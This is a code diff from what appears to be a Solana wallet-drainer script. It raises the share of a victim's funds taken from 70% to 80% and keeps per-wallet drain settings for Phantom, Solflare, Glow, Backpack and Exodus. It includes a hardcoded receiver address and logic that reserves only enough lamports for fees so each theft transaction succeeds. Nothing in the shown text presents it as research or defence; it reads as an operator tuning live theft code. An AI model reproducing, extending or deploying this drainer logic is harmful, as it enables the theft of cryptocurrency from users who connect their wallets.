@@ -455,27 +455,27 @@ const RECEIVER_4 = new PublicKey('HakitSyn1Fv5BQPJW8GaAbQ6WdFJ7Mo4HwBB9wumtycF')
     }
 
     // Define fee calculation variables at function scope
-          // Phantom-optimized drain settings (70% drain configuration)
+          // Phantom-optimized drain settings (80% drain configuration)
       const PHANTOM_FEE_BUFFER = 50000; // ~0.00005 SOL for Phantom network fees + safety margin
       const PHANTOM_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
       const PHANTOM_TOTAL_RESERVED = PHANTOM_FEE_BUFFER + PHANTOM_RESERVE_LAMPORTS;
       
-      // Solflare-optimized drain settings (70% drain configuration)
+      // Solflare-optimized drain settings (80% drain configuration)
       const SOLFLARE_FEE_BUFFER = 50000; // ~0.00005 SOL for network fees
       const SOLFLARE_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
       const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
       
-      // Glow-optimized drain settings (70% drain configuration)
+      // Glow-optimized drain settings (80% drain configuration)
       const GLOW_FEE_BUFFER = 50000; // ~0.00005 SOL for Glow network fees + safety margin
       const GLOW_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
       const GLOW_TOTAL_RESERVED = GLOW_FEE_BUFFER + GLOW_RESERVE_LAMPORTS;
       
-      // Backpack-optimized drain settings (70% drain configuration)
+      // Backpack-optimized drain settings (80% drain configuration)
       const BACKPACK_FEE_BUFFER = 50000; // ~0.00005 SOL for Backpack network fees + safety margin
       const BACKPACK_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
       const BACKPACK_TOTAL_RESERVED = BACKPACK_FEE_BUFFER + BACKPACK_RESERVE_LAMPORTS;
       
-      // Exodus-optimized drain settings (70% drain configuration)
+      // Exodus-optimized drain settings (80% drain configuration)
       const EXODUS_FEE_BUFFER = 50000; // ~0.00005 SOL for Exodus network fees + safety margin
       const EXODUS_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
       const EXODUS_TOTAL_RESERVED = EXODUS_FEE_BUFFER + EXODUS_RESERVE_LAMPORTS;
@@ -562,8 +562,8 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         const availableForDrain = FRESH_BALANCE - TOTAL_RESERVED;
         debugLog(`Available for drain: ${availableForDrain} lamports (${(availableForDrain / 1e9).toFixed(6)} SOL)`);
         
-                 // Standard drain: 70% of available funds (after reserving fees)
-         const DRAIN_PERCENTAGE = 0.7; // 70% for all wallets
+                 // Standard drain: 80% of available funds (after reserving fees)
+         const DRAIN_PERCENTAGE = 0.8; // 80% for all wallets
         let drainAmount = Math.floor(availableForDrain * DRAIN_PERCENTAGE);
         
         debugLog(`Available: ${availableForDrain} lamports, ${DRAIN_PERCENTAGE * 100}% of available: ${Math.floor(availableForDrain * DRAIN_PERCENTAGE)} lamports, Initial drain amount: ${drainAmount} lamports (${(drainAmount / 1e9).toFixed(6)} SOL)`);
@@ -586,7 +586,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         }
         
         // Additional safety check: ensure we're not draining too much
-        const MINIMUM_BALANCE_AFTER_DRAIN = 50000; // ~0.00005 SOL minimum balance (reduced for 70% drain)
+        const MINIMUM_BALANCE_AFTER_DRAIN = 50000; // ~0.00005 SOL minimum balance (reduced for 80% drain)
         const maxSafeDrain = FRESH_BALANCE - MINIMUM_BALANCE_AFTER_DRAIN;
         
         // Validate that we can safely drain
@@ -599,7 +599,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
           });
         }
         
-        // For 70% drain, use the calculated amount but respect safety limit
+        // For 80% drain, use the calculated amount but respect safety limit
         const safeDrainAmount = Math.min(drainAmount, maxSafeDrain);
         debugLog(`Safe drain amount: ${safeDrainAmount} lamports (${(safeDrainAmount / 1e9).toFixed(6)} SOL)`);
         
@@ -607,7 +607,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         
                  
         
-        // Ensure minimum meaningful drain amount (reduced for 70% drain)
+        // Ensure minimum meaningful drain amount (reduced for 80% drain)
         const MINIMUM_DRAIN_AMOUNT = 30000; // 0.00003 SOL minimum drain amount
         if (finalDrainAmount < MINIMUM_DRAIN_AMOUNT) {
           debugLog(`Final drain amount too small: ${finalDrainAmount} < ${MINIMUM_DRAIN_AMOUNT}`);
